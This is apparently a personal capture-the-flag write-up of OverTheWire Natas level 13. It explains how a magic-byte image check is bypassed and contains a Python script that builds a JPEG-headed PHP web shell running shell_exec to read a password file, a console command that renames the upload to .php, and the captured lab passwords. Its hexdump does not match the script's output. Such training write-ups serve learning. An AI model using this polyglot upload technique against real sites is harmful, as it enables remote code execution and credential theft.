# Natas Level 12 → Level 13 Fake image file signature

## Previous Flag
<b>trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC</b>

## Goal
Username: natas13<br>
URL: http://natas13.natas.labs.overthewire.org<br>

For security reasons, we now only accept image files!<br>
Choose a JPEG to upload (max 1KB):<br>
Choose File     No File Chosen<br>
Upload File

## What I learned
```
exif_imagetype() not check file extension only actual binary content (magic bytes) of file
Bypasses:
    Upload a valid image file with PHP code embedded after the image data
    Ensure the header bytes look like a JPEG or PNG
    Rename it to .php (if allowed) or something like .php.jpg
    Trigger the PHP execution by accessing the uploaded file directly
```
<br>

| Magic Bytes       | File Type                        | Description                                     |
|-------------------|----------------------------------|-------------------------------------------------|
| <b>FF D8 FF E0</b>| JPEG (JFIF)                      | JPEG image with JFIF metadata                   |
| FF D8 FF E1       | JPEG (Exif)                      | JPEG image with EXIF metadata                   |
| FF D8 FF DB       | JPEG                             | JPEG with quantization table                    |
| FF D9             | JPEG                             | End of Image (EOI) marker                       |
| 89 50 4E 47 0D 0A 1A 0A | PNG                        | PNG image                                       |
| 47 49 46 38 37 61 | GIF87a                           | GIF image (older format)                        |
| 47 49 46 38 39 61 | GIF89a                           | GIF image (newer format)                        |
| 42 4D             | BMP                              | Bitmap image (BMP)                              |
| 25 50 44 46       | PDF                              | PDF file                                        |
| 50 4B 03 04       | ZIP / DOCX / PPTX / XLSX         | ZIP archive or MS Office Open XML formats       |
| 52 61 72 21 1A 07 00 | RAR                           | RAR archive (v1.5+)                             |
| 7F 45 4C 46       | ELF                              | Executable and Linkable Format (Linux binary)   |
| 4D 5A             | EXE / DLL                        | Windows Executable (MZ header)                  |
| 3C 3F 70 68 70    | PHP                              | PHP script starting with `<?php`                |
| EF BB BF          | UTF-8 BOM                        | Byte Order Mark for UTF-8 encoded files         |
| D0 CF 11 E0 A1 B1 1A E1 | DOC / XLS / PPT            | Older MS Office binary formats                  |
| 00 61 73 6D       | WASM                             | WebAssembly binary  

## Solution
```
Click View source code
http://natas13.natas.labs.overthewire.org/index-source.html

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas13", "pass": "<censored>" };</script></head>
<body>
<h1>natas13</h1>
<div id="content">
For security reasons, we now only accept image files!<br/><br/>

<?php
function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) { 👀
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>

# Create new .png name test.png

# Fake an image file signature
#!/bin/python

with open("test.php", "wb") as f:
    # Write JPEG header bytes
    f.write(b'\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00')
    # Write PHP code
    f.write(b'<?php echo shell_exec("cat /etc/natas_webpass/natas14"); ?>')
    # Write JPEG EOI marker
    f.write(b'\xFF\xD9')

# Open in Notepad++
ÿØÿàshell_exec("cat /etc/natas_webpass/natas14");

# Open in hexdump
@trungdullc ➜ /workspaces/01noobHacker (main) $ hexdump static/test.png
0000000 d8ff e0ff 6873 6c65 5f6c 7865 6365 2228
0000010 6163 2074 652f 6374 6e2f 7461 7361 775f
0000020 6265 6170 7373 6e2f 7461 7361 3431 2922
0000030 003b                                   
0000031

# Modify hidden input field in browser’s javascript console
$('input[name="filename"]').val("test.php") ⌨️

# Upload payload (test.png)
The file upload/hrpcjtt3z1.php has been uploaded
����.JFIF....z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ �� 🔐
```

## Flag
<b>z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ</b>

## Continue
[Continue](/overthewire/Natas1314.md)